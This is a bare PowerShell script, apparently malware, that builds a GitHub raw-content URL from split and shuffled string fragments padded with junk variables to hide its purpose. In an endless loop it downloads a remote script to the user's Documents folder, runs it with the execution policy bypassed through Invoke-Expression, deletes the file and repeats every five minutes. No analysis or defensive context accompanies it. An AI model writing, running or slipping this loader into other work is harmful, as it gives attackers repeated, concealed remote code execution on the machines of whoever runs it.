$junk1 = "jf9sd7fsd9f" + "s8df79sdf87sd"
$junk2 = "udf8sd7f" + "sd89f7dsf8sd"
$x1 = ('https://r','aw.g','ithubu','serco','nten','t.co','m/')[0,1,2,3,4,5,6] -join ''
$y1 = ('t0f','u')[0]
$y2 = ('v9','4837-0','9273w','54-068')[0..3] -join ''
$y3 = ('b2-40','59y-b','n3-240')[0..2] -join ''
$z1 = ('50-69','u-')[0,1] -join ''
$z2 = ('50-8620','54986-2','034p2')[0..2] -join ''
$x2 = $y1 + $y2 + $y3 + $z1 + $z2 + ('345iuyu6','po7iu2','9345w')[0..2] -join ''
$x3 = ('main','/ps2','.ps1')[0,1,2] -join ''
$trash1 = "asdd09asdd" + "098adsd"
$trash2 = "wer098w" + "098wer98"
$url1 = $x1
$url2 = $x2
$url3 = $x3
$urlFinal = $url1 + $url2 + $url3
$path1 = "$env:USERPROFILE"
$path2 = "\Documents\ps2.ps1"
$filePath = $path1 + $path2
$dummy = Get-Process | Where-Object { $_.Name -eq "dummyprocess" }
while ($true) {
    try {
        $junk = "randomstring" + "junkdata"
        $cmd = "Invoke-WebRequest -Uri " + $urlFinal + " -OutFile " + $filePath
        Invoke-Expression $cmd
        $execCmd = "powershell -ExecutionPolicy Bypass -File " + $filePath
        Invoke-Expression $execCmd
        $removeCmd = "Remove-Item -Path " + $filePath + " -Force"
        Invoke-Expression $removeCmd
    } catch {
        $errorVar = "err" + "junk"
    }
    $sleepVar = "sleep" + "junk"
    Start-Sleep -Seconds 300
}
